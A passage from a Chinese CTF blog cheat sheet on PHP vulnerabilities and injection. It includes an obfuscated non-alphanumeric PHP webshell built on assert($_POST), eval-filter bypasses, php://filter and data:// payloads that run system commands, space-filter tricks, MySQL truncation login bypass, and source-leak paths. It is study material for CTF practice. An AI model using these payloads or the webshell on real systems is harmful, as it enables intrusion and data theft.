class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; <span class="comment">// T</span></span><br><span class="line">$___.=$__;</span><br><span class="line"></span><br><span class="line">$____=<span class="string">&#x27;_&#x27;</span>;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; <span class="comment">// P</span></span><br><span class="line">$____.=$__;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; <span class="comment">// O</span></span><br><span class="line">$____.=$__;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; <span class="comment">// S</span></span><br><span class="line">$____.=$__;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; <span class="comment">// T</span></span><br><span class="line">$____.=$__;</span><br><span class="line"></span><br><span class="line">$_=$$____;</span><br><span class="line">$___($_[_]); <span class="comment">// ASSERT($_POST[_]);</span></span><br><span class="line"><span class="comment">//POST: _=phpinfo();</span></span><br></pre></td></tr></table></figure>
+<ol start="7">
+<li><code>eval()</code><br>先用探针试试，<code>echo phpinfo();</code><br>执行系统命令加上反引号，echo `ls`;<br>被过滤？我不仅有<code>echo</code>，我还有<code>print</code>、<code>die</code>、<code>include</code>、<code>require</code>、<code>include_once</code>、<code>require_once</code>等<br>例如web入门32<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-04 00:12:34</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-04 00:56:31</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c = $_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(/i&quot;</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+</li>
+</ol>
+<p>可以用include函数和post传伪协议构成payload:<br><code>?c=include$_GET[a]?&gt;&amp;a=php://filter/read=convert.base64-encode/resource=flag.php</code></p>
+</li>
+</ul>
+<ol start="8">
+<li>过滤空格<br><code>%09（tab）</code>、<code>$&#123;IFS&#125;</code>、<code>$IFS$9</code>、<code>&lt;&gt;</code>、<code>&lt;</code>、<code>%0a（/n）</code><br>eg: <code>cat&lt;1.txt </code></li>
+<li>过滤挺多的读文件函数，看看能用<code>nl</code>不</li>
+<li>有时候不要拘泥于读文件，可以通过复制，重命名读取php文件内容（函数执行后，访问url/flag.txt），类似注入的重命名<br><code>copy()、rename()</code></li>
+<li></li>
+</ol>
+<h2 id="MySQL特性"><a href="#MySQL特性" class="headerlink" title="MySQL特性"></a>MySQL特性</h2><ol>
+<li>两个单引号表示一个原意单引号，可拼接字符串</li>
+<li>注释注入会发生在版本比注释大的条件下</li>
+<li>自动转换查询进制</li>
+<li>在数据库的字符串比较中，如果两个字符串的长度不一样，则会将较短的字符串末尾填充空格，使两个字符串的长度一致；<br>例如账号长度为6，则注册<code>admin 1</code>即可绕过admin密码</li>
+</ol>
+<h2 id="LFI-local-file-include"><a href="#LFI-local-file-include" class="headerlink" title="LFI(local file include)"></a><a target="_blank" rel="noopener" href="https://www.smi1e.top/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E4%B8%8Ephp%E4%BC%AA%E5%8D%8F%E8%AE%AE/">LFI(local file include)</a></h2><ul>
+<li>PHP中支持的伪协议<br>LFI一般使用伪协议读文件，but，why？<br>一般读的是<code>*.php</code>文件，如果flag是其中的变量，那么不能直接在前端看到，所以用伪协议的base64转一下，而且如果输出过滤了关键字，那么读取的可能不完整，所以用伪协议的编码<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">file:&#x2F;&#x2F; — 访问本地文件系统</span><br><span class="line">http:&#x2F;&#x2F; — 访问 HTTP(s) 网址</span><br><span class="line">ftp:&#x2F;&#x2F; — 访问 FTP(s) URLs</span><br><span class="line">php:&#x2F;&#x2F; — 访问各个输入&#x2F;输出流（I&#x2F;O streams）</span><br><span class="line">zlib:&#x2F;&#x2F; — 压缩流</span><br><span class="line">data:&#x2F;&#x2F; — 数据（RFC 2397）</span><br><span class="line">glob:&#x2F;&#x2F; — 查找匹配的文件路径模式</span><br><span class="line">phar:&#x2F;&#x2F; — PHP 归档</span><br><span class="line">ssh2:&#x2F;&#x2F; — Secure Shell 2</span><br><span class="line">rar:&#x2F;&#x2F; — RAR</span><br><span class="line">ogg:&#x2F;&#x2F; — 音频流</span><br><span class="line">expect:&#x2F;&#x2F; — 处理交互式的流</span><br></pre></td></tr></table></figure></li>
+<li>一些示例<br><code>php://filter/read=convert.base64-encode/resource=/flag</code><br><code>php://filter/read=string.rot13/resource=/flag</code><br><code>?c=data://text/plain,&lt;?php system(&#39;cat f*&#39;);?&gt;</code><br><code>?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==</code></li>
+<li>过滤不严谨也可以用目录绕过<br>比如<code>if($_GET[&#39;u&#39;]==&#39;flag.php&#39;)</code>，可以用此payload：<code>?u=./flag.php</code></li>
+</ul>
+<h1 id="注入骚姿势"><a href="#注入骚姿势" class="headerlink" title="注入骚姿势"></a>注入骚姿势</h1><h2 id="约束注入"><a href="#约束注入" class="headerlink" title="约束注入"></a>约束注入</h2><p>参考MySQL特性4</p>
+<h1 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h1><h2 id="文件泄露-–-gt-phps"><a href="#文件泄露-–-gt-phps" class="headerlink" title="文件泄露 –&gt; phps"></a>文件泄露 –&gt; phps</h2><p>访问<code>*.phps</code>即可下载对应php文件</p>
+<blockquote>
+<p>什么是phps？<br>phps文件就是php的源代码文件，通常用于提供给用户（访问者）直接通过Web浏览器查看php代码的内容<br>因为用户无法直接通过Web浏览器“看到”php文件的内容，所以需要用phps文件代替。<br>其实，只要不用php等已经在服务器中注册过的MIME类型的文件扩展名即可，但为了国际通用，所以才用了phps文件类型。<br><code>text/html, application/x-httpd-php-source, application/x-httpd-php3-source</code></p>
+</blockquote>
+<h2 id="探针-雅黑PHP探针-phpinfo"><a href="#探针-雅黑PHP探针-phpinfo" class="headerlink" title="探针 雅黑PHP探针 phpinfo"></a>探针 雅黑PHP探针 phpinfo</h2><p>PHP探针是用来探测空间、服务器运行状况和PHP信息用的，探针可以实时查看服务器硬盘资源、内存占用、网卡 流量、系统负载、服务器时间等信息。<br>例：ctfshow web16：url后缀名添加<code>/tz.php</code> 版本是雅黑PHP探针</p>
+<h1 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h1><h2 id="文件泄露（叹之师傅博客）"><a href="#文件泄露（叹之师傅博客）" class="headerlink" title="文件泄露（叹之师傅博客）"></a>文件泄露（<a target="_blank" rel="noopener" href="https://www.cnblogs.com/wangtanzhi/p/12173215.html">叹之师傅博客</a>）</h2><p>WEB-INF/web.xml泄露<br>例题： <a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#\[RoarCTF%202019]Easy%20Java">https://buuoj.cn/challenges#\[RoarCTF%202019]Easy%20Java</a></p>
+<blockquote>
+<p>WEB-INF主要包含一下文件或目录:<br>/WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。<br>/WEB-INF/classes/：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中<br>/WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件<br>/WEB-INF/src/：源码目录，按照包名结构放置各个java文件。<br>/WEB-INF/database.properties：数据库配置文件<br>漏洞检测以及利用方法：通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码</p>
+</blockquote>
+<p>漏洞成因：通常一些web应用我们会使用多个web服务器搭配使用，解决其中的一个web服务器的性能缺陷以及做均衡负载的优点和完成一些分层结构的安全策略等。在使用这种架构的时候，由于对静态资源的目录或文件的映射配置不当，可能会引发一些的安全问题，导致web.xml等文件能够被读取。漏洞检测以及利用方法：通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码。一般情况，jsp引擎默认都是禁止访问WEB-INF目录的，Nginx 配合Tomcat做均衡负载或集群等情况时，问题原因其实很简单，Nginx不会去考虑配置其他类型引擎（Nginx不是jsp引擎）导致的安全问题而引入到自身的安全规范中来（这样耦合性太高了），修改Nginx配置文件禁止访问WEB-INF目录就好了： location ~ ^/WEB-INF/* { deny all; } 或者return 404; 或者其他！</p>
+<h1 id="杂七杂八"><a href="#杂七杂八" class="headerlink" title="杂七杂八"></a>杂七杂八</h1><h2 id="LINUX"><a href="#LINUX" class="headerlink" title="LINUX"></a>LINUX</h2><ul>
+<li><p><code>#</code> –&gt; 统计字符<br><code>echo $&#123;#HOME&#125;</code>输出5</p>
+</li>
+<li><p><code>$(())</code>与``类似<br><code>echo $((a+$b))</code>，变量加不加<code>$</code>都行<br><code>echo $((16#4a))</code> –&gt; 42 (都转成10进制哦)</p>
+</li>
+<li><p><code>&amp;&amp;</code>与<code>||</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1.command1 &amp; command2 &amp; command3</span><br><span class="line">三个命令同时执行</span><br><span class="line">2.command1; command2; command3</span><br><span class="line">不管前面命令执行成功没有，后面的命令继续执行</span><br><span class="line">3.command1 &amp;&amp; command2</span><br><span class="line">只有前面命令执行成功，后面命令才继续执行</span><br></pre></td></tr></table></figure>
+<p><code>command1  &amp;&amp; command2</code> –&gt; &amp;&amp;左边的命令（命令1）返回真(即返回0，成功被执行）后，&amp;&amp;右边的命令（命令2）才能够被执行；换句话说，“如果这个命令执行成功&amp;&amp;那么执行这个命令”<br><code>command1 || command2</code> –&gt;<br>||则与&amp;&amp;相反。如果||左边的命令（命令1）未执行成功，那么就执行||右边的命令（命令2）；或者换句话说，“如果这个命令执行失败了||那么就执行这个命令</p>
+<h2 id="常见源码泄露"><a href="#常见源码泄露" class="headerlink" title="常见源码泄露"></a><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Lmg66/p/13598803.html">常见源码泄露</a></h2><p>git、svn、<a target="_blank" rel="noopener" href="http://www.zip、bazaar/bzr%E3%80%81[cvs](https://github.com/kost/dvcs-ripper.git)%E3%80%81WEB-INF/web.xml/">www.zip、Bazaar/bzr、[cvs](https://github.com/kost/dvcs-ripper.git)、WEB-INF/web.xml\</a><br>泄露重要(editor)的信息 直接在url后面添加<code>/editor</code><br>常见备份文件后缀</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">.index.php.swp</span><br><span class="line">index.php.swp</span><br><span class="line">index.php.bak</span><br><span class="line">.index.php~</span><br><span class="line">index.php.bak_Edietplus</span><br><span class="line">index.php.~</span><br><span class="line">index.php.~1~</span><br><span class="line">index.php</span><br><span class="line">index.php~</span><br><span class="line">index.php.rar</span><br><span class="line">index.php.zip</span><br><span class="line">index.php.7z</span><br><span class="line">index.php.tar.gz</span><br><span class="line">www.zip</span><br><span class="line">www.rar</span><br><span class="line">www.zip</span><br><span class="line">www.7z</span><br><span class="line">www.tar.gz</span><br><span class="line">www.tar</span><br><span class="line">web.zip</span><br><span class="line">web.rar</span><br><span class="line">web.zip</span><br><span class="line">web.7z</span><br><span class="line">web.tar.gz</span><br><span class="line">web.tar</span><br><span class="line">wwwroot.rar</span><br><span class="line">web.rar</span><br></pre></td></tr></table></figure></li>
+</ul>
+
+    </div>
+
+    
+    
+    
+        <div class="reward-container">
+  <div></div>
+  <button onclick="var qr = document.getElementById('qr'); qr.style.display = (qr.style.display === 'none') ? 'block' : 'none';">
+    打赏
+  </button>
+  <div id="qr" style="display: none;">
+      
+      <div style="display: inline-block;">
+        <img src="/images/wechatpay.png" alt="yq1ng 微信支付">
+        <p>微信支付</p>
+      </div>
+      
+      <div style="display: inline-block;">
+        <img src="/images/alipay.jpg" alt="yq1ng 支付宝">
+        <p>支付宝</p>
+      </div>
+
+  </div>
+</div>
+
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>yq1ng
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="http://yq1ng.github.io/z_post/%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/" title="PHP漏洞与注入总结">http://yq1ng.github.io/z_post/注入总结/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/" rel="tag"><i class="fa fa-tag"></i> ...</a>
+              <a href="/tags/Java/" rel="tag"><i class="fa fa-tag"></i> Java</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/z_post/%E5%AE%89%E6%B4%B5%E6%9D%AF2019-web-WP/" rel="prev" title="安洵杯2019 web WP">
+      <i class="fa fa-chevron-left"></i> 安洵杯2019 web WP
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/z_post/ctfshow-36D-web/" rel="next" title="ctfshow 36D web">
+      ctfshow 36D web <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%B8%80%E4%BA%9B%E7%AE%80%E5%8D%95bypass"><span class="nav-number">1.</span> <span class="nav-text">一些简单bypass</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%95%B0%E5%80%BC%E8%A2%ABban"><span class="nav-number">1.1.</span> <span class="nav-text">数值被ban</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80%E4%BA%9B%E5%87%BD%E6%95%B0bypass"><span class="nav-number">1.2.</span> <span class="nav-text">一些函数bypass</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#RCE"><span class="nav-number">1.3.</span> <span class="nav-text">RCE</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#MySQL%E7%89%B9%E6%80%A7"><span class="nav-number">1.4.</span> <span class="nav-text">MySQL特性</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#LFI-local-file-include"><span class="nav-number">1.5.</span> <span class="nav-text">LFI(local file include)</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%B3%A8%E5%85%A5%E9%AA%9A%E5%A7%BF%E5%8A%BF"><span class="nav-number">2.</span> <span class="nav-text">注入骚姿势</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BA%A6%E6%9D%9F%E6%B3%A8%E5%85%A5"><span class="nav-number">2.1.</span> <span class="nav-text">约束注入</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#PHP"><span class="nav-number">3.</span> <span class="nav-text">PHP</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2-%E2%80%93-gt-phps"><span class="nav-number">3.1.</span> <span class="nav-text">文件泄露 –&gt; phps</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%8E%A2%E9%92%88-%E9%9B%85%E9%BB%91PHP%E6%8E%A2%E9%92%88-phpinfo"><span class="nav-number">3.2.</span> <span class="nav-text">探针 雅黑PHP探针 phpinfo</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#JAVA"><span class="nav-number">4.</span> <span class="nav-text">JAVA</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2%EF%BC%88%E5%8F%B9%E4%B9%8B%E5%B8%88%E5%82%85%E5%8D%9A%E5%AE%A2%EF%BC%89"><span class="nav-number">4.1.</span> <span class="nav-text">文件泄露（叹之师傅博客）</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB"><span class="nav-number">5.</span> <span class="nav-text">杂七杂八</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#LINUX"><span class="nav-number">5.1.</span> <span class="nav-text">LINUX</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B8%B8%E8%A7%81%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2"><span class="nav-number">5.2.</span> <span class="nav-text">常见源码泄露</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="yq1ng"
+      src="/images/xiaoxin.jpg">
+  <p class="site-author-name" itemprop="name">yq1ng</p>
+  <div class="site-description" itemprop="description">The best way to know your strength is to fight</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">42</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/yq1ng" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;yq1ng" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://blog.csdn.net/weixin_43578492" title="CSDN → https:&#x2F;&#x2F;blog.csdn.net&#x2F;weixin_43578492" rel="noopener" target="_blank"><i class="heartbeat fa-fw"></i>CSDN</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:1578422748@qq.com" title="E-Mail → mailto:1578422748@qq.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="http://wpa.qq.com/msgrd?v=3&uin=%271578422748++%27&site=qq&menu=yes" title="QQ → http:&#x2F;&#x2F;wpa.qq.com&#x2F;msgrd?v&#x3D;3&amp;uin&#x3D;&#39;1578422748++&#39;&amp;site&#x3D;qq&amp;menu&#x3D;yes" rel="noopener" target="_blank"><i class="qq fa-fw"></i>QQ</a>
+      </span>
+  </div>
+
+
+
+      </div>
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        <script
+  async
+  src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"
+></script>
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">yq1ng</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+      <span class="post-meta-item-text">站点总字数：</span>
+    <span title="站点总字数">191k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+      <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
+    <span title="站点阅读时长">5:18</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+<br />
+<!-- 网站运行时间的设置 -->
+<span id="timeDate">载入天数...</span>
+<span id="times">载入时分秒...</span>
+<script>
+    var now = new Date();
+    function createtime() {
+        var grt= new Date("09/27/2020 00:00:00");//此处修改你的建站时间或者网站上线时间
+        now.setTime(now.getTime()+250);
+        days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days);
+        hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours);
+        if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
+        mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;}
+        seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
+        snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;}
+        document.getElementById("timeDate").innerHTML = "本站已安全运行 "+dnum+" 天 ";
+        document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒";
+    }
+setInterval("createtime()",250);
+</script>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  
+  <script color='0,0,255' opacity='0.5' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  <!-- 页面点击小红心 -->
+  <script type="text/javascript" src="/js/src/clicklove.js"></script>
+</body>
+</html>
